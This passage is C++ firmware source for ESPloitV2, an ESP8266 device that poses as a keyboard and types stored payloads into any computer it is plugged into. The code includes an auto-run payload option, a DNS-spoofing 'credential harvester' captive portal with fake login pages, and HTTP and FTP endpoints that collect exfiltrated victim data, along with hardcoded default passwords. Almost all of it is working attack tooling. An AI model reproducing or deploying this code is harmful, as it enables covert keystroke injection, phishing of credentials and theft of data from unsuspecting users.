/*
 * ESPloitV2
 * WiFi controlled HID Keyboard Emulator
 * By Corey Harding of www.Exploit.Agency / www.LegacySecurityGroup.com
 * Special thanks to minkione for helping port/test original V1 code to the Cactus Micro rev2
 * ESPloit is distributed under the MIT License. The license and copyright notice can not be removed and must be distributed alongside all future copies of the software.
 * MIT License
    
    Copyright (c) [2017] [Corey Harding]
    
    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:
    
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.
    
    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
*/

/*
 * ============================================================================
 * INCLUDES
 * ============================================================================
 * PROGMEM HTML templates (stored in flash, not RAM):
 *   HelpText.h    - Help/documentation page (card-based, 19 sections)
 *   License.h     - MIT license text display page
 *   inputmode.h   - Keyboard/mouse HID control interface
 *   spoof_page.h  - ESPortal credential harvester templates (5 themes)
 *   Duckuino.h    - DuckyScript-to-ESPloit converter (includes jQuery)
 *   style.h       - Shared CSS theme served from /style.css endpoint
 *   version.h     - Firmware version strings
 *
 * ESP8266 platform libraries:
 *   ESP8266WiFi      - WiFi AP/STA mode management
 *   ESP8266WebServer  - HTTP server on port 80 (main UI)
 *   ESP8266HTTPUpdateServer - OTA firmware update server on port 1337
 *   ESP8266FtpServer  - FTP server for payload/exfil file management (PASV)
 *   DNSServer         - DNS spoofing for ESPortal captive portal
 *   ArduinoJson 5.11.0 - Config file serialization (StaticJsonBuffer API)
 *   FS (SPIFFS)        - Flash filesystem for payloads and config storage
 * ============================================================================
 */
#include "HelpText.h"
#include "License.h"
#include "inputmode.h"
#include "version.h"
#include "spoof_page.h"
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266httpUpdate.h>
#include <ESP8266HTTPUpdateServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include <ArduinoJson.h>       // v5.11.0 - uses StaticJsonBuffer (NOT v6 JsonDocument)
#include <ESP8266FtpServer.h>  // https://github.com/exploitagency/esp8266FTPServer/tree/feature/bbx10_speedup
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include "Duckuino.h"
#include "style.h"             // Shared CSS theme - served from /style.css with browser caching
//#include <SoftwareSerial.h>
//#include <DoubleResetDetector.h> // Double Reset Detector library VERSION: 1.0.0 by Stephen Denne https://github.com/datacute/DoubleResetDetector

//Setup RX and TX pins to be used for the software serial connection
//const int RXpin=5;
//const int TXpin=4;
//SoftwareSerial SOFTserial(RXpin,TXpin);

//Double Reset Detector
/*
#define DRD_TIMEOUT 5
#define DRD_ADDRESS 0
DoubleResetDetector drd(DRD_TIMEOUT, DRD_ADDRESS);
*/

#define LED_BUILTIN 2

/*
 * Server instances:
 *   server (port 80)   - Main web UI, payload management, ESPortal
 *   httpServer (1337)   - OTA firmware update endpoint (/update)
 *   ftpSrv              - FTP server for payload/exfil file access (PASV mode)
 *   dnsServer (port 53) - DNS spoofing for ESPortal captive portal
 */
ESP8266WebServer server(80);
ESP8266WebServer httpServer(1337);
ESP8266HTTPUpdateServer httpUpdater;
FtpServer ftpSrv;
const byte DNS_PORT = 53;
DNSServer dnsServer;

HTTPClient http;
String latestversion = "";
String ardversion;

const char* update_path = "/update";
int accesspointmode;
char ssid[32];
char password[64];
int channel;
int hidden;
char local_IPstr[16];
char gatewaystr[16];
char subnetstr[16];
char update_username[32];
char update_password[64];
char ftp_username[32];
char ftp_password[64];
int ftpenabled;
int esportalenabled;
char welcome_domain[128];
char welcome_redirect[128];
char site1_domain[128];
char site1_redirect[128];
char site2_domain[128];
char site2_redirect[128];
char site3_domain[128];
char site3_redirect[128];
char site_other_redirect[128];
int DelayLength;
int livepayloaddelay;
int autopwn;
char autopayload[64];
int open_network=0;

/*
 * runpayload() - Execute a stored payload file from SPIFFS
 * Reads the autopayload file line-by-line and sends HID commands
 * via serial to the ATmega 32u4 coprocessor.
 * Supports: Rem, DefaultDelay, CustomDelay, BlinkLED, and all
 * HID commands (Print, PrintLine, Press, MouseMove, etc.)
 */
void runpayload() {
    File f = SPIFFS.open(autopayload, "r");
    int defaultdelay = DelayLength;
    int settingsdefaultdelay = DelayLength;
    int custom_delay;
    delay(livepayloaddelay);
    while(f.available()) {
//      SOFTserial.println(line);
//      Serial.println(line);
      String line = f.readStringUntil('\n');
      line.replace("&lt;", "<");

      String fullkeys = line;
      int str_len = fullkeys.length()+1; 
      char keyarray[str_len];
      fullkeys.toCharArray(keyarray, str_len);

      char *i;
      String cmd;
      String cmdinput;
      cmd = String(strtok_r(keyarray,":",&i));

//         Serial.println(String()+"cmd:"+cmd);
//         Serial.println(String()+"cmdin:"+cmdinput);
     
      if(cmd == "Rem") {
        cmdinput = String(strtok_r(NULL,":",&i));
        DelayLength = 0;
      }
      
      else if(cmd == "DefaultDelay") {
        cmdinput = String(strtok_r(NULL,":",&i));
        DelayLength = 1500;
        String newdefaultdelay = cmdinput;
        defaultdelay = newdefaultdelay.toInt();
//          Serial.println(String()+"default delay set to:"+defaultdelay);
      }
      else if(cmd == "BlinkLED") {
        cmdinput = String(strtok_r(NULL,":",&i));
        int blinkcount = cmdinput.toInt();
        for (int i=1; i <= blinkcount; i++){
          digitalWrite(LED_BUILTIN, LOW);
          delay(750);
          digitalWrite(LED_BUILTIN, HIGH);
          delay(500);
        }
      }
      else if(cmd == "CustomDelay") {
        cmdinput = String(strtok_r(NULL,":",&i));
        String customdelay = cmdinput;
        custom_delay = customdelay.toInt();
        DelayLength = custom_delay;
//          Serial.println(String()+"Custom delay set to:"+custom_delay);
      }
      else {
        Serial.println(line);
      }
//        Serial.println(DelayLength);
      delay(DelayLength); //delay between lines in payload, I found running it slower works best
      DelayLength = defaultdelay;
    }
    f.close();
    DelayLength = settingsdefaultdelay;
}

/* settingsPage() - Render the device configuration form
 * Sections: WiFi config, Admin credentials, FTP, ESPortal, Payload settings
 * All form fields POST to /settings (handled by handleSubmitSettings)
 * Radio buttons use checked="" attribute from current config values */
void settingsPage()
{
  if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
  String accesspointmodeyes;
  String accesspointmodeno;
  if (accesspointmode==1){
    accesspointmodeyes=" checked=\"checked\"";
    accesspointmodeno="";
  }
  else {
    accesspointmodeyes="";
    accesspointmodeno=" checked=\"checked\"";
  }
  String autopwnyes;
  String autopwnno;
  if (autopwn==1){
    autopwnyes=" checked=\"checked\"";
    autopwnno="";
  }
  else {
    autopwnyes="";
    autopwnno=" checked=\"checked\"";
  }
  String ftpenabledyes;
  String ftpenabledno;
  if (ftpenabled==1){
    ftpenabledyes=" checked=\"checked\"";
    ftpenabledno="";
  }
  else {
    ftpenabledyes="";
    ftpenabledno=" checked=\"checked\"";
  }
  String esportalenabledyes;
  String esportalenabledno;
  if (esportalenabled==1){
    esportalenabledyes=" checked=\"checked\"";
    esportalenabledno="";
  }
  else {
    esportalenabledyes="";
    esportalenabledno=" checked=\"checked\"";
  }
  String hiddenyes;
  String hiddenno;
  if (hidden==1){
    hiddenyes=" checked=\"checked\"";
    hiddenno="";
  }
  else {
    hiddenyes="";
    hiddenno=" checked=\"checked\"";
  }
  server.send(200, "text/html",
  String()+
  F(
  "<!DOCTYPE HTML><html><head>"
  "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
  "<title>ESPloit Settings</title>"
  "<link rel=\"stylesheet\" href=\"/style.css\">"
  "</head><body>"
  "<div class=\"nav\"><span class=\"brand\">ESPloit Settings</span><a href=\"/esploit\">Dashboard</a><a href=\"/restoredefaults\" class=\"btn btn-d\">Restore Defaults</a></div>"
  "<FORM action=\"/settings\" id=\"configuration\" method=\"post\">"
  "<div class=\"card\"><h2>WiFi Configuration</h2>"
  "<div class=\"fr\"><label>Network Type</label><span>"
  "<label class=\"rl\"><INPUT type=\"radio\" name=\"accesspointmode\" value=\"1\"")+accesspointmodeyes+F(">Access Point</label>"
  "<label class=\"rl\"><INPUT type=\"radio\" name=\"accesspointmode\" value=\"0\"")+accesspointmodeno+F(">Join Network</label>"
  "</span></div>"
  "<div class=\"fr\"><label>Hidden SSID</label><span>"
  "<label class=\"rl\"><INPUT type=\"radio\" name=\"hidden\" value=\"1\"")+hiddenyes+F(">Yes</label>"
  "<label class=\"rl\"><INPUT type=\"radio\" name=\"hidden\" value=\"0\"")+hiddenno+F(">No</label>"
  "</span></div>"
  "<div class=\"fr\"><label>SSID</label><input type=\"text\" name=\"ssid\" value=\"")+ssid+F("\" maxlength=\"31\"></div>"
  "<div class=\"fr\"><label>Password</label><input type=\"password\" name=\"password\" value=\"")+password+F("\" maxlength=\"64\"></div>"
  "<div class=\"fr\"><label>Channel</label><select name=\"channel\" form=\"configuration\"><option value=\"")+channel+"\" selected>"+channel+F("</option><option value=\"1\">1</option><option value=\"2\">2</option><option value=\"3\">3</option><option value=\"4\">4</option><option value=\"5\">5</option><option value=\"6\">6</option><option value=\"7\">7</option><option value=\"8\">8</option><option value=\"9\">9</option><option value=\"10\">10</option><option value=\"11\">11</option><option value=\"12\">12</option><option value=\"13\">13</option><option value=\"14\">14</option></select></div>"
  "<div class=\"fr\"><label>IP Address</label><input type=\"text\" name=\"local_IPstr\" value=\"")+local_IPstr+F("\" maxlength=\"16\"></div>"
  "<div class=\"fr\"><label>Gateway</label><input type=\"text\" name=\"gatewaystr\" value=\"")+gatewaystr+F("\" maxlength=\"16\"></div>"
  "<div class=\"fr\"><label>Subnet</label><input type=\"text\" name=\"subnetstr\" value=\"")+subnetstr+F("\" maxlength=\"16\"></div>"
  "</div>"
  "<div class=\"card\"><h2>Administration</h2>"
  "<div class=\"fr\"><label>Username</label><input type=\"text\" name=\"update_username\" value=\"")+update_username+F("\" maxlength=\"31\"></div>"
  "<div class=\"fr\"><label>Password</label><input type=\"password\" name=\"update_password\" value=\"")+update_password+F("\" maxlength=\"64\"></div>"
  "</div>"
  "<div class=\"card\"><h2>FTP Exfiltration Server</h2><small>Changes require a reboot.</small><br><br>"
  "<div class=\"fr\"><label>Status</label><span>"
  "<label class=\"rl\"><INPUT type=\"radio\" name=\"ftpenabled\" value=\"1\"")+ftpenabledyes+F(">Enabled</label>"
  "<label class=\"rl\"><INPUT type=\"radio\" name=\"ftpenabled\" value=\"0\"")+ftpenabledno+F(">Disabled</label>"
  "</span></div>"
  "<div class=\"fr\"><label>FTP Username</label><input type=\"text\" name=\"ftp_username\" value=\"")+ftp_username+F("\" maxlength=\"31\"></div>"
  "<div class=\"fr\"><label>FTP Password</label><input type=\"password\" name=\"ftp_password\" value=\"")+ftp_password+F("\" maxlength=\"64\"></div>"
  "</div>"
  "<div class=\"card\"><h2>ESPortal Credential Harvester</h2>"
  "<small>Changes require a reboot. When enabled, main menu moves to <code>http://IP/esploit</code></small><br>"
  "<small>Do not leave any line blank or as a duplicate of another.</small><br><br>"
  "<div class=\"fr\"><label>Status</label><span>"
  "<label class=\"rl\"><INPUT type=\"radio\" name=\"esportalenabled\" value=\"1\"")+esportalenabledyes+F(">Enabled</label>"
  "<label class=\"rl\"><INPUT type=\"radio\" name=\"esportalenabled\" value=\"0\"")+esportalenabledno+F(">Disabled</label>"
  "</span></div>"
  "<div class=\"fr\"><label>Welcome Domain</label><input type=\"text\" name=\"welcome_domain\" value=\"")+welcome_domain+F("\" maxlength=\"127\"></div>"
  "<div class=\"fr\"><label>Welcome Page On</label><input type=\"text\" name=\"welcome_redirect\" value=\"")+welcome_redirect+F("\" maxlength=\"127\"></div>"
  "<div class=\"fr\"><label>Site1 Domain</label><input type=\"text\" name=\"site1_domain\" value=\"")+site1_domain+F("\" maxlength=\"127\"></div>"
  "<div class=\"fr\"><label>Site1 Page On</label><input type=\"text\" name=\"site1_redirect\" value=\"")+site1_redirect+F("\" maxlength=\"127\"></div>"
  "<div class=\"fr\"><label>Site2 Domain</label><input type=\"text\" name=\"site2_domain\" value=\"")+site2_domain+F("\" maxlength=\"127\"></div>"
  "<div class=\"fr\"><label>Site2 Page On</label><input type=\"text\" name=\"site2_redirect\" value=\"")+site2_redirect+F("\" maxlength=\"127\"></div>"
  "<div class=\"fr\"><label>Site3 Domain</label><input type=\"text\" name=\"site3_domain\" value=\"")+site3_domain+F("\" maxlength=\"127\"></div>"
  "<div class=\"fr\"><label>Site3 Page On</label><input type=\"text\" name=\"site3_redirect\" value=\"")+site3_redirect+F("\" maxlength=\"127\"></div>"
  "<div class=\"fr\"><label>Catch All Page On</label><input type=\"text\" name=\"site_other_redirect\" value=\"")+site_other_redirect+F("\" maxlength=\"127\"></div>"
  "</div>"
  "<div class=\"card\"><h2>Payload Settings</h2>"
  "<div class=\"fr\"><label>Line Delay (ms)</label><input type=\"number\" name=\"DelayLength\" value=\"")+DelayLength+F("\" maxlength=\"31\"> <small>Default: 2000</small></div>"
  "<div class=\"fr\"><label>Startup Delay (ms)</label><input type=\"number\" name=\"LivePayloadDelay\" value=\"")+livepayloaddelay+F("\" maxlength=\"31\"> <small>Default: 3000</small></div>"
  "<div class=\"fr\"><label>Auto-Deploy</label><span>"
  "<label class=\"rl\"><INPUT type=\"radio\" name=\"autopwn\" value=\"1\"")+autopwnyes+F(">Yes</label>"
  "<label class=\"rl\"><INPUT type=\"radio\" name=\"autopwn\" value=\"0\"")+autopwnno+F(">No</label>"
  "</span></div>"
  "<div class=\"fr\"><label>Auto Payload</label><input type=\"text\" name=\"autopayload\" value=\"")+autopayload+F("\" maxlength=\"64\"></div>"
  "</div>"
  "<INPUT type=\"radio\" name=\"SETTINGS\" value=\"1\" hidden=\"1\" checked=\"checked\">"
  "<div class=\"flex\"><INPUT type=\"submit\" value=\"Apply Settings\" class=\"btn btn-p\"> <a href=\"/reboot\" class=\"btn btn-w\">Reboot Device</a></div>"
  "</FORM>"
  "</body></html>"
  )
  );
}

/* handleSettings() - Route handler for /settings
 * GET  -> renders settingsPage() form
 * POST -> handleSubmitSettings() saves config to SPIFFS JSON */
void handleSettings()
{
  if (server.hasArg("SETTINGS")) {
    handleSubmitSettings();
  }
  else {
    settingsPage();
  }
}

void returnFail(String msg)
{
  server.sendHeader("Connection", "close");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(500, "text/plain", msg + "\r\n");
}

/* handleSubmitSettings() - Process settings form POST
 * Reads all form args into global config vars, saves to SPIFFS JSON,
 * then reloads config. Some settings (WiFi, FTP, ESPortal) require reboot. */
void handleSubmitSettings()
{
  String SETTINGSvalue;

  if (!server.hasArg("SETTINGS")) return returnFail("BAD ARGS");
  
  SETTINGSvalue = server.arg("SETTINGS");
  accesspointmode = server.arg("accesspointmode").toInt();
  server.arg("ssid").toCharArray(ssid, 32);
  server.arg("password").toCharArray(password, 64);
  channel = server.arg("channel").toInt();
  hidden = server.arg("hidden").toInt();
  server.arg("local_IPstr").toCharArray(local_IPstr, 16);
  server.arg("gatewaystr").toCharArray(gatewaystr, 16);
  server.arg("subnetstr").toCharArray(subnetstr, 16);
  server.arg("update_username").toCharArray(update_username, 32);
  server.arg("update_password").toCharArray(update_password, 64);
  server.arg("ftp_username").toCharArray(ftp_username, 32);
  server.arg("ftp_password").toCharArray(ftp_password, 64);
  ftpenabled = server.arg("ftpenabled").toInt();
  esportalenabled = server.arg("esportalenabled").toInt();
  server.arg("welcome_domain").toCharArray(welcome_domain,128);
  server.arg("welcome_redirect").toCharArray(welcome_redirect,128);
  server.arg("site1_domain").toCharArray(site1_domain,128);
  server.arg("site1_redirect").toCharArray(site1_redirect,128);
  server.arg("site2_domain").toCharArray(site2_domain,128);
  server.arg("site2_redirect").toCharArray(site2_redirect,128);
  server.arg("site3_domain").toCharArray(site3_domain,128);
  server.arg("site3_redirect").toCharArray(site3_redirect,128);
  server.arg("site_other_redirect").toCharArray(site_other_redirect,128);
  DelayLength = server.arg("DelayLength").toInt();
  livepayloaddelay = server.arg("LivePayloadDelay").toInt();
  autopwn = server.arg("autopwn").toInt();
  server.arg("autopayload").toCharArray(autopayload, 64);
  
  if (SETTINGSvalue == "1") {
    saveConfig();
    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a></div><div class=\"success\">Settings saved successfully.</div><div class=\"card\"><p>Some settings may require a reboot before taking effect.</p><p>If network configuration changed, connect to the new network to access ESPloit.</p><br><div class=\"flex\"><a href=\"/reboot\" class=\"btn btn-w\">Reboot Device</a><a href=\"/esploit\" class=\"btn\">Back to Dashboard</a></div></div></body></html>"));
    loadConfig();
  }
  else if (SETTINGSvalue == "0") {
    settingsPage();
  }
  else {
    returnFail("Bad SETTINGS value");
  }
}

bool loadDefaults() {
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.createObject();
  json["version"] = version;
  json["accesspointmode"] = "1";
  json["ssid"] = "Exploit";
  if(open_network==0){
    json["password"] = "DotAgency";
  }
  else if(open_network==1){
    json["password"] = "";
  }
  json["channel"] = "6";
  json["hidden"] = "0";
  json["local_IP"] = "192.168.1.1";
  json["gateway"] = "192.168.1.1";
  json["subnet"] = "255.255.255.0";
  json["update_username"] = "admin";
  json["update_password"] = "hacktheplanet";
  json["ftp_username"] = "ftp-admin";
  json["ftp_password"] = "hacktheplanet";
  json["ftpenabled"] = "0";
  json["esportalenabled"] = "0";
  json["welcome_domain"] = "ouraccesspoint.com";
  json["welcome_redirect"] = "/welcome";
  json["site1_domain"] = "fakesite1.com";
  json["site1_redirect"] = "/login";
  json["site2_domain"] = "fakesite2.com";
  json["site2_redirect"] = "/sign-in";
  json["site3_domain"] = "fakesite3.com";
  json["site3_redirect"] = "/authenticate";
  json["site_other_redirect"] = "/user/login";
  json["DelayLength"] = "2000";
  json["LivePayloadDelay"] = "3000";
  json["autopwn"] = "0";
  json["autopayload"] = "/payloads/payload.txt";
  File configFile = SPIFFS.open("/esploit.json", "w");
  json.printTo(configFile);
  loadConfig();
}

bool loadConfig() {
  File configFile = SPIFFS.open("/esploit.json", "r");
  if (!configFile) {
    loadDefaults();
  }

  size_t size = configFile.size();

  std::unique_ptr<char[]> buf(new char[size]);
  configFile.readBytes(buf.get(), size);
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.parseObject(buf.get());
  
  if (!json["version"]) {
    loadDefaults();
    ESP.restart();
  }

  //Resets config to factory defaults on an update.
  if (json["version"]!=version) {
    loadDefaults();
    ESP.restart();
  }

  strcpy(ssid, (const char*)json["ssid"]);
  strcpy(password, (const char*)json["password"]);
  channel = json["channel"];
  hidden = json["hidden"];
  accesspointmode = json["accesspointmode"];
  strcpy(local_IPstr, (const char*)json["local_IP"]);
  strcpy(gatewaystr, (const char*)json["gateway"]);
  strcpy(subnetstr, (const char*)json["subnet"]);

  strcpy(update_username, (const char*)json["update_username"]);
  strcpy(update_password, (const char*)json["update_password"]);

  strcpy(ftp_username, (const char*)json["ftp_username"]);
  strcpy(ftp_password, (const char*)json["ftp_password"]);
  ftpenabled = json["ftpenabled"];

  esportalenabled = json["esportalenabled"];
  strcpy(welcome_domain, (const char*)json["welcome_domain"]);
  strcpy(welcome_redirect, (const char*)json["welcome_redirect"]);
  strcpy(site1_domain, (const char*)json["site1_domain"]);
  strcpy(site1_redirect, (const char*)json["site1_redirect"]);
  strcpy(site2_domain, (const char*)json["site2_domain"]);
  strcpy(site2_redirect, (const char*)json["site2_redirect"]);
  strcpy(site3_domain, (const char*)json["site3_domain"]);
  strcpy(site3_redirect, (const char*)json["site3_redirect"]);
  strcpy(site_other_redirect, (const char*)json["site_other_redirect"]);
  
  DelayLength = json["DelayLength"];
  livepayloaddelay = json["LivePayloadDelay"];

  autopwn = json["autopwn"];
  strcpy(autopayload, (const char*)json["autopayload"]);

  IPAddress local_IP;
  local_IP.fromString(local_IPstr);
  IPAddress gateway;
  gateway.fromString(gatewaystr);
  IPAddress subnet;
  subnet.fromString(subnetstr);

/*
  Serial.println(accesspointmode);
  Serial.println(ssid);
  Serial.println(password);
  Serial.println(channel);
  Serial.println(hidden);
  Serial.println(local_IP);
  Serial.println(gateway);
  Serial.println(subnet);
*/

  WiFi.persistent(false);
  //ESP.eraseConfig();
// Determine if set to Access point mode
  if (accesspointmode == 1) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP);

//    Serial.print("Starting Access Point ... ");
//    Serial.println(WiFi.softAP(ssid, password, channel, hidden) ? "Success" : "Failed!");
    WiFi.softAP(ssid, password, channel, hidden);

//    Serial.print("Setting up Network Configuration ... ");
//    Serial.println(WiFi.softAPConfig(local_IP, gateway, subnet) ? "Success" : "Failed!");
    WiFi.softAPConfig(local_IP, gateway, subnet);

//    WiFi.reconnect();

//    Serial.print("IP address = ");
//    Serial.println(WiFi.softAPIP());
  }
// or Join existing network
  else if (accesspointmode != 1) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
//    Serial.print("Setting up Network Configuration ... ");
    WiFi.config(local_IP, gateway, subnet);
//    WiFi.config(local_IP, gateway, subnet);

//    Serial.print("Connecting to network ... ");
//    WiFi.begin(ssid, password);
    WiFi.begin(ssid, password);
    WiFi.reconnect();

//    Serial.print("IP address = ");
//    Serial.println(WiFi.localIP());
  }

  return true;
}

bool saveConfig() {
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.createObject();
  json["version"] = version;
  json["accesspointmode"] = accesspointmode;
  json["ssid"] = ssid;
  json["password"] = password;
  json["channel"] = channel;
  json["hidden"] = hidden;
  json["local_IP"] = local_IPstr;
  json["gateway"] = gatewaystr;
  json["subnet"] = subnetstr;
  json["update_username"] = update_username;
  json["update_password"] = update_password;
  json["ftp_username"] = ftp_username;
  json["ftp_password"] = ftp_password;
  json["ftpenabled"] = ftpenabled;
  json["esportalenabled"] = esportalenabled;
  json["welcome_domain"] = welcome_domain;
  json["welcome_redirect"] = welcome_redirect;
  json["site1_domain"] = site1_domain;
  json["site1_redirect"] = site1_redirect;
  json["site2_domain"] = site2_domain;
  json["site2_redirect"] = site2_redirect;
  json["site3_domain"] = site3_domain;
  json["site3_redirect"] = site3_redirect;
  json["site_other_redirect"] = site_other_redirect;
  json["DelayLength"] = DelayLength;
  json["LivePayloadDelay"] = livepayloaddelay;
  json["autopwn"] = autopwn;
  json["autopayload"] = autopayload;

  File configFile = SPIFFS.open("/esploit.json", "w");
  json.printTo(configFile);
  return true;
}

File fsUploadFile;
String webString;

void handleFileUpload()
{
  if(server.uri() != "/upload") return;
  HTTPUpload& upload = server.upload();
  if(upload.status == UPLOAD_FILE_START){
    String filename = upload.filename;
    filename = "/payloads/"+filename;
//    Serial.print("Uploading file "); 
//    Serial.print(filename+" ... ");
    String truncatedname = filename.substring(0,31);
    fsUploadFile = SPIFFS.open(truncatedname, "w");
    filename = String();
  }
  else if(upload.status == UPLOAD_FILE_WRITE){
    if(fsUploadFile)
    fsUploadFile.write(upload.buf, upload.currentSize);
  }
  else if(upload.status == UPLOAD_FILE_END){
    if(fsUploadFile)
    fsUploadFile.close();
//    Serial.println("Success");
  }
}

/* ListPayloads() - List files in a SPIFFS directory as a styled HTML table
 * Serves two paths: /listpayloads (payloads dir) and /exfiltrate/list (root dir)
 * Exfiltrate view also shows exfiltration method reference (Serial, HTTP, FTP) */
void ListPayloads(){
  String directory;
  if(server.uri() == "/listpayloads") directory="/payloads";
  if(server.uri() == "/exfiltrate/list") directory="/";
  FSInfo fs_info;
  SPIFFS.info(fs_info);
  String total;
  total=fs_info.totalBytes;
  String used;
  used=fs_info.usedBytes;
  String freespace;
  freespace=fs_info.totalBytes-fs_info.usedBytes;
  String FileList = "<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body>";
  Dir dir = SPIFFS.openDir(directory);
  if(server.uri() == "/listpayloads") FileList += "<div class=\"nav\"><span class=\"brand\">Payloads</span><a href=\"/esploit\">Dashboard</a><a href=\"/uploadpayload\">Upload</a><a href=\"/livepayload\">Live Mode</a></div><div class=\"card\"><div class=\"stat\"><span>Total: <b>"+total+"</b> B</span><span>Free: <b>"+freespace+"</b> B</span><span>Used: <b>"+used+"</b> B</span></div></div><div class=\"card\"><table><tr><th>Payload</th><th>Size</th><th>Actions</th></tr>";
  if(server.uri() == "/exfiltrate/list") FileList += String()+F("<div class=\"nav\"><span class=\"brand\">Exfiltrated Data</span><a href=\"/esploit\">Dashboard</a></div><div class=\"card\"><h2>Exfiltration Methods</h2><p><b>Serial:</b> Set baud to 38400, send <code>SerialEXFIL:</code> followed by data.</p><p><b>HTTP:</b> <code>http://<b>")+local_IPstr+"</b>/exfiltrate?file=<b>FILE</b>&amp;data=<b>DATA</b></code></p><p><b>FTP (PASV):</b> Server: <b>"+local_IPstr+"</b> User: <b>"+ftp_username+"</b> Pass: <b>"+ftp_password+"</b></p><small>Network: IP=<b>"+local_IPstr+"</b> SSID=<b>"+ssid+"</b></small></div><div class=\"card\"><div class=\"stat\"><span>Total: <b>"+total+"</b> B</span><span>Free: <b>"+freespace+"</b> B</span><span>Used: <b>"+used+"</b> B</span></div><table><tr><th>File</th><th>Size</th><th>Actions</th></tr>";
  while (dir.next()) {
    String FileName = dir.fileName();
    File f = dir.openFile("r");
    FileList += " ";
    if(server.uri() == "/listpayloads") FileList += "<tr><td><a href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a></td><td>"+f.size()+"</td><td class=\"flex\"><a href=\"/dopayload?payload="+FileName+"\" class=\"btn btn-p\">Run</a><a href=\""+FileName+"\" class=\"btn\">Download</a><a href=\"/deletepayload?payload="+FileName+"\" class=\"btn btn-d\">Delete</a></td></tr>";
    if((server.uri() == "/exfiltrate/list")&&(!FileName.startsWith("/payloads/"))&&(!FileName.startsWith("/esploit.json"))&&(!FileName.startsWith("/esportal.json"))&&(!FileName.startsWith("/config.json"))) FileList += "<tr><td><a href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a></td><td>"+f.size()+"</td><td class=\"flex\"><a href=\""+FileName+"\" class=\"btn\">Download</a><a href=\"/deletepayload?payload="+FileName+"\" class=\"btn btn-d\">Delete</a></td></tr>";
  }
  FileList += "</table></div></body></html>";
  server.send(200, "text/html", FileList);
}

bool RawFile(String rawfile) {
  if (SPIFFS.exists(rawfile)) {
    if(!server.authenticate(update_username, update_password)){
      server.requestAuthentication();}
    File file = SPIFFS.open(rawfile, "r");
    size_t sent = server.streamFile(file, "application/octet-stream");
    file.close();
    return true;
  }
  return false;
}

/* ShowPayloads() - Display contents of a single payload/exfil file
 * Non-.txt files redirect to raw download. Text files render in <pre> block.
 * Three conditional layouts: payload (with Run button), exfil data, other */
void ShowPayloads(){
  webString="";
  String payload;
  String ShowPL;
  payload += server.arg(0);
  File f = SPIFFS.open(payload, "r");
  String webString = f.readString();
  f.close();
  if (!payload.endsWith(".txt")) {
    server.sendHeader("Location", String("http://"+String(local_IPstr)+payload), true);
    server.send ( 302, "text/plain", "");
  }
  if (payload.startsWith("/payloads/")) ShowPL = String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Payload Viewer</span><a href=\"/esploit\">Dashboard</a><a href=\"/listpayloads\">Payloads</a></div><div class=\"card\"><div class=\"flex mb\"><a href=\"/dopayload?payload=")+payload+"\" class=\"btn btn-p\">Run Payload</a><a href=\""+payload+"\" class=\"btn\">Download</a><a href=\"/deletepayload?payload="+payload+"\" class=\"btn btn-d\">Delete</a></div><h3>"+payload+"</h3><pre>"+webString+"</pre></div></body></html>";
  else if (!payload.startsWith("/payloads")) ShowPL = String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">File Viewer</span><a href=\"/esploit\">Dashboard</a><a href=\"/exfiltrate/list\">Exfiltrated Data</a></div><div class=\"card\"><div class=\"flex mb\"><a href=\"")+payload+"\" class=\"btn\">Download</a><a href=\"/deletepayload?payload="+payload+"\" class=\"btn btn-d\">Delete</a></div><h3>"+payload+"</h3><pre>"+webString+"</pre></div></body></html>";
  else ShowPL = String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">File Viewer</span><a href=\"/esploit\">Dashboard</a><a href=\"/exfiltrate/list\">Data</a></div><div class=\"card\"><div class=\"flex mb\"><a href=\"")+payload+"\" class=\"btn\">Download</a><a href=\"/deletepayload?payload="+payload+"\" class=\"btn btn-d\">Delete</a></div><h3>"+payload+"</h3><pre>"+webString+"</pre></div></body></html>";
  webString="";
  server.send(200, "text/html", ShowPL);
}

/*
 * ============================================================================
